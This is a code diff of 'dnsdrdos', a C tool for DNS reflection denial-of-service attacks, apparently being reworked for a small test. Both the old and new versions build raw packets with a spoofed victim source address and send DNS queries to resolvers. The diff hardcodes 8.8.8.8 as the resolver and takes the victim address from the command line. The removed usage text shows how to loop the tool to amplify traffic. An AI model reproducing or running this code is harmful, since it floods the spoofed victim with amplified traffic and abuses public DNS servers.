@@ -19,7 +19,7 @@
 
 /* default settings */
 #define DEFAULT_SPOOF_ADDR  "127.0.0.1"
-#define DEFAULT_DOMAIN      "www.nctu.edu.tw"
+#define DEFAULT_DOMAIN      "www.nctu.edu.tw."
 #define DEFAULT_DNS_PORT    53
 #define DEFAULT_LOOPS       10000
 
@@ -32,7 +32,7 @@
                                __LINE__); fflush(stderr); perror(""); \
     __EXIT_FAILURE } while (0)
 
-
+char *spoof_addr;
 typedef struct{
     unsigned char name;
     unsigned short type;
@@ -70,17 +70,6 @@ typedef struct {
 } query_t;
 
 
-/* our job */
-typedef struct {
-    char *file;
-    char **addrs;
-    uint16_t port;
-    unsigned int num_addrs;
-    char *spoof_addr;
-    char *domain;
-    unsigned int loops;
-} job_t;
-
 
 /* our bomb */
 typedef struct {
@@ -97,226 +86,34 @@ typedef struct {
 
 
 /* just wrapper */
-void *xmalloc(size_t);
+/*void *xmalloc(size_t);
 void *xmemset(void *, int, size_t);
 int xsocket(int, int, int);
 void xclose(int);
 void xsendto(int, const void *, size_t, int, const struct sockaddr *,
-             socklen_t);
-
+             socklen_t);*/
 /* prog stuff */
-void banner();
+
 void usage();
-void check_argc(int);
-void check_args();
-FILE *open_file(char *);
-unsigned int count_lines(char *);
-char **read_lines(char *, unsigned int);
+
+
 void check_uid();
 
 /* net stuff */
 bomb_t *create_rawsock(bomb_t *);
 bomb_t *stfu_kernel(bomb_t *);
 unsigned short checksum(unsigned short *, int);
-bomb_t *build_ip_header(bomb_t *, job_t *, int);
-bomb_t *build_udp_header(bomb_t *, job_t *);
-bomb_t *build_dns_request(bomb_t *, job_t *);
+bomb_t *build_ip_header(bomb_t *);
+bomb_t *build_udp_header(bomb_t *);
+bomb_t *build_dns_request(bomb_t *);
 void dns_name_format(char *, char *);
-bomb_t *build_packet(bomb_t *, job_t *, int);
+bomb_t *build_packet(bomb_t *,  int);
 bomb_t *fill_sockaddr(bomb_t *);
-void run_dnsdrdos(job_t *, int);
-void free_dnsdrdos(job_t *);
+void run_dnsdrdos(int);
+void free_dnsdrdos();
 
 
-/* wrapper for malloc() */
-void *xmalloc(size_t size)
-{
-   void *buff;
-
-
-   if ((buff = malloc(size)) == NULL) {
-       __ERR_GEN;
-   }
-
-   return buff;
-}
-
-
-/* wrapper for memset() */
-void *xmemset(void *s, int c, size_t n)
-{
-   if (!(s = memset(s, c, n))) {
-       __ERR_GEN;
-   }
-
-   return s;
-}
-
-
-/* wrapper for socket() */
-int xsocket(int domain, int type, int protocol)
-{
-    int sockfd = 0;
-
-
-    sockfd = socket(domain, type, protocol);
-
-    if (sockfd == -1) {
-        __ERR_GEN;
-    }
-
-    return sockfd;
-}
-
-
-/* wrapper for setsockopt() */
-void xsetsockopt(int sockfd, int level, int optname, const void *optval,
-                 socklen_t optlen)
-{
-    int x = 0;
-
-
-    x = setsockopt(sockfd, level, optname, optval, optlen);
-
-    if (x != 0) {
-        __ERR_GEN;
-    }
-
-    return;
-}
-
-
-/* wrapper for close() */
-void xclose(int fd)
-{
-    int x = 0;
-
-
-    x = close(fd);
-
-    if (x != 0) {
-        __ERR_GEN;
-    }
-
-    return;
-}
-
-
-/* wrapper for sendto() */
-void xsendto(int sockfd, const void *buf, size_t len, int flags,
-             const struct sockaddr *dest_addr, socklen_t addrlen)
-{
-    int x = 0;
-
-    
-    x = sendto(sockfd, buf, len, flags, dest_addr, addrlen);
-
-    if (x == -1) {
-        __ERR_GEN;
-    }
-
-    return;
-}
-
-
-/* just our leet banner */
-void banner()
-{
-    printf("-----------------------------------------------\
-    \ndnsdrdos - by noptrix - http://www.noptrix.net/\
-    \n-----------------------------------------------\n");
-
-    return;
-}
-
-
-/* usage and help */
-void usage()
-{
-    printf("usage:\n\n\
-  dnsdrdos -f <file> [options] | [misc]\n\
-    \ntarget:\n\n\
-  -f <file>       - list of dns servers (only one ip-address per line!)\n\
-  -s <addr>       - ip-address to spoof (default: 127.0.0.1)\n\
-  -d <domain>     - which domain should be requested?\n\
-                    (default: \"google.com.\")\n\
-  -l <num>        - how many loops through list? (default: 10000)\n\nmisc:\n\n\
-  -V              - show version\n\
-  -H              - show help and usage\n\nexample:\n\n\
-  ./dnsdrdos -f nameserver.lst -s 192.168.2.211 -d google.com. -l 10000\n\n\
-  or better:\n\n\
-  $ for i in `seq 1 1000`; do ./dnsdrdos -f nameserver.lst \\\n\
-  -s 192.168.2.211 -d $i -l 10000; done\n\n\
-  This is better, because we ask dynamically for any domain names.\n\
-  Even if the domainname is not given, 'we' still would recieve DNS\n\
-  answers.\n");
-
-    __EXIT_SUCCESS;
-
-    return;
-}
-
-
-/* check first usage */
-void check_argc(int argc)
-{
-    if (argc < 2) {
-        fprintf(stderr, "[-] ERROR: use -H for help and usage\n");
-        __EXIT_FAILURE;
-    }
-
-    return;
-}
-
-
-/* check if host and port are selected */
-void check_args(job_t *job)
-{
-    if (!(job->file) || !(job->spoof_addr) || (job->loops <= 0)) {
-        fprintf(stderr, "[-] ERROR: you fucked up, mount /dev/brain\n");
-        __EXIT_FAILURE
-    }
-
-    return;
-}
-
-
-/* open file and return file pointer */
-FILE *open_file(char *file)
-{
-    FILE *fp = NULL;
-
-
-    if (!(fp = fopen(file, "r"))) {
-        __ERR_GEN;
-    }
-
-    return fp;
-}
-
-
-/* count lines -> wc -l :) */
-unsigned int count_lines(char *file)
-{
-    FILE *fp = NULL;
-    int c = 0;
-    unsigned int lines = 0;
-
-
-    fp = open_file(file);
-
-    while ((c = fgetc(fp)) != EOF) {
-        if ((c == '\n') || (c == 0x00)) {
-            lines++;
-        }
-    }
-    fclose(fp);
-
-    return lines;
-}
-
-
-/* read in ip-addresses line by line */
+/* read in ip-addresses line by line *//*
 char **read_lines(char *file, unsigned int lines)
 {
     FILE *fp = NULL;
@@ -349,42 +146,15 @@ char **read_lines(char *file, unsigned int lines)
 
     return words;
 }
+*/
 
 
-/* set default values */
-job_t *set_defaults()
-{
-    job_t *job;
-
-
-    job = (job_t *) xmalloc(sizeof(job_t));
-    job = xmemset(job, 0x00, sizeof(job_t));
-
-    job->port = (uint16_t) DEFAULT_DNS_PORT;
-    job->spoof_addr = DEFAULT_SPOOF_ADDR;
-    job->domain = DEFAULT_DOMAIN;
-    job->loops = (unsigned int) DEFAULT_LOOPS;
-
-    return job;
-}
-
-
-/* check for uid */
-void check_uid()
-{
-    if (getuid() != 0) {
-        fprintf(stderr, "[-] ERROR: you need to be r00t\n");
-        __EXIT_FAILURE;
-    }
-
-    return;
-}
 
 
 /* create raw socket */
 bomb_t *create_rawsock(bomb_t *bomb)
 {
-    bomb->sock = xsocket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    bomb->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
     return bomb;
 }
@@ -395,7 +165,7 @@ bomb_t *stfu_kernel(bomb_t *bomb)
 {
     bomb->one = 1;
 
-    xsetsockopt(bomb->sock, IPPROTO_IP, IP_HDRINCL, &bomb->one, 
+    setsockopt(bomb->sock, IPPROTO_IP, IP_HDRINCL, &bomb->one, 
                 sizeof(bomb->one));
 
     return bomb;
@@ -425,22 +195,22 @@ unsigned short checksum(unsigned short *addr, int len)
 
 
 /* build and fill in ip header */
-bomb_t *build_ip_header(bomb_t *bomb, job_t *job, int c)
+bomb_t *build_ip_header(bomb_t *bomb)
 {
     bomb->ip = (struct iphdr *) bomb->packet;
 
     bomb->ip->version = 4;
     bomb->ip->ihl = 5;
     bomb->ip->id = htonl(rand());
-    bomb->ip->saddr = inet_addr(job->spoof_addr);
-    bomb->ip->daddr = inet_addr(job->addrs[c]);
+    bomb->ip->saddr = inet_addr(spoof_addr);
+    bomb->ip->daddr = inet_addr("8.8.8.8");
     bomb->ip->ttl = 64;
     bomb->ip->tos = 0;
     bomb->ip->frag_off = 0;
     bomb->ip->protocol = IPPROTO_UDP;
     bomb->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) +
                               sizeof(dnsheader_t) + sizeof(query_t) + sizeof(dns_opt)
-                             + strlen(job->domain) + 1);
+                             + strlen(DEFAULT_DOMAIN) + 1);
     bomb->ip->check = checksum((unsigned short *) bomb->ip,
                                sizeof(struct iphdr));
 
@@ -449,13 +219,13 @@ bomb_t *build_ip_header(bomb_t *bomb, job_t *job, int c)
 
 
 /* build and fill in udp header */
-bomb_t *build_udp_header(bomb_t *bomb, job_t *job)
+bomb_t *build_udp_header(bomb_t *bomb)
 {
     bomb->udp = (struct udphdr *) (bomb->packet + sizeof(struct iphdr));
 
     bomb->udp->source = htons(rand());
     bomb->udp->dest = htons(DEFAULT_DNS_PORT);
-    bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(dns_opt) + sizeof(query_t) + strlen(job->domain) + 1);
+    bomb->udp->len = htons(sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(dns_opt) + sizeof(query_t) + strlen(DEFAULT_DOMAIN) + 1);
     bomb->udp->check = 0;
 
     return bomb;
@@ -484,7 +254,7 @@ void dns_name_format(char *qname, char *host)
 
 
 /* build and fill in dns request */
-bomb_t *build_dns_request(bomb_t *bomb, job_t *job)
+bomb_t *build_dns_request(bomb_t *bomb)
 {
     char *qname = NULL;
 
@@ -511,7 +281,7 @@ bomb_t *build_dns_request(bomb_t *bomb, job_t *job)
     qname = &bomb->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
         sizeof(dnsheader_t)];
     /*job->domain = "www.google.com.";*/
-    dns_name_format(qname, job->domain);
+    dns_name_format(qname, DEFAULT_DOMAIN);
 
     bomb->query = (query_t *) &bomb->packet[sizeof(struct iphdr) + 
         sizeof(struct udphdr) + sizeof(dnsheader_t) + (strlen(qname) + 1)];
@@ -534,14 +304,15 @@ bomb_t *build_dns_request(bomb_t *bomb, job_t *job)
 
 
 /* build packet */
-bomb_t *build_packet(bomb_t *bomb, job_t *job, int c)
-{
-    bomb->packet = (char *) xmalloc(4096);
-    bomb->packet = xmemset(bomb->packet, 0x00, 4096);
+bomb_t *build_packet(bomb_t *bomb, int c)
+{   
+    printf("check3\n");
+    bomb->packet = (char *) malloc(4096);
+    bomb->packet = memset(bomb->packet, 0x00, 4096);
 
-    bomb = build_ip_header(bomb, job, c);
-    bomb = build_udp_header(bomb, job);
-    bomb = build_dns_request(bomb, job);
+    bomb = build_ip_header(bomb);
+    bomb = build_udp_header(bomb);
+    bomb = build_dns_request(bomb);
 
     return bomb;
 }
@@ -559,24 +330,25 @@ bomb_t *fill_sockaddr(bomb_t *bomb)
 
 
 /* start action! */
-void run_dnsdrdos(job_t *job, int c)
+void run_dnsdrdos(int c)
 {
+    printf("check2\n");
     bomb_t *bomb = NULL;
 
     
-    bomb = (bomb_t *) xmalloc(sizeof(bomb_t));
-    bomb = xmemset(bomb, 0x00, sizeof(bomb_t));
+    bomb = (bomb_t *) malloc(sizeof(bomb_t));
+    bomb = memset(bomb, 0x00, sizeof(bomb_t));
 
     bomb = create_rawsock(bomb);
     bomb = stfu_kernel(bomb);
-    bomb = build_packet(bomb, job, c);
+    bomb = build_packet(bomb, c);
     bomb = fill_sockaddr(bomb);
 
-    xsendto(bomb->sock, bomb->packet, sizeof(struct iphdr) + 
-            sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(query_t) + sizeof(dns_opt)+ strlen(job->domain) + 1, 0, (struct sockaddr *) &bomb->target, 
+    sendto(bomb->sock, bomb->packet, sizeof(struct iphdr) + 
+            sizeof(struct udphdr) + sizeof(dnsheader_t) + sizeof(query_t) + sizeof(dns_opt)+ strlen(DEFAULT_DOMAIN) + 1, 0, (struct sockaddr *) &bomb->target, 
             sizeof(bomb->target));
 
-    xclose(bomb->sock);
+    close(bomb->sock);
     free(bomb->packet);
     free(bomb);
 
@@ -585,73 +357,28 @@ void run_dnsdrdos(job_t *job, int c)
 
 
 /* free dnsdrdos \o/ */
-void free_dnsdrdos(job_t *job)
-{
-    int i = 0;
-
-    for (i = 0; i < job->num_addrs; i++) {
-        free(job->addrs[i]);
-    }
-
-    free(job);
-
-    return;
-}
-
 
 /* here we go */
 int main(int argc, char **argv)
 {
     int c = 0;
     unsigned int i = 0;
-    job_t *job;
+   
+    printf("check0\n");
 
-
-    banner();           /* banner output is important! */
-    check_argc(argc);
-    job = set_defaults();
-
-    while ((c = getopt(argc, argv, "f:s:d:l:VH")) != -1) {
-        switch (c) {
-         case 'f':
-             job->file = optarg;
-             break;
-         case 's':
-             job->spoof_addr = optarg;
-             break;
-         case 'd':
-             job->domain = optarg;
-             break;
-         case 'l':
-             job->loops = (unsigned int) ATOI(optarg);
-             break;
-         case 'V':
-             puts(VERSION);
-             __EXIT_SUCCESS;
-             break;
-         case 'H':
-             usage();
-             break;
-             __EXIT_SUCCESS;
-        }
-    }
-
-    check_args(job);
-    
-    job->num_addrs = count_lines(job->file);
-    job->addrs = read_lines(job->file, job->num_addrs);
-    
-    check_uid();
-    
-    for (i = 0; i < job->loops; i++) {
-        for (c = 0; c < job->num_addrs; c++) {
-            run_dnsdrdos(job, c);
-        printf("packet %d\n",i);
-        }
+    printf("%s\n",argv[1] );
+    spoof_addr = argv[1];
+    printf("%s\n", spoof_addr);
+    printf("check1\n");
+    for (i = 0; i < 10; i++) {
+        
+            run_dnsdrdos( c);
+            printf("packet %d\n",i);
+        
     }
     printf("\n");
     
-    free_dnsdrdos(job);
+ 
     
     return 0;
 }
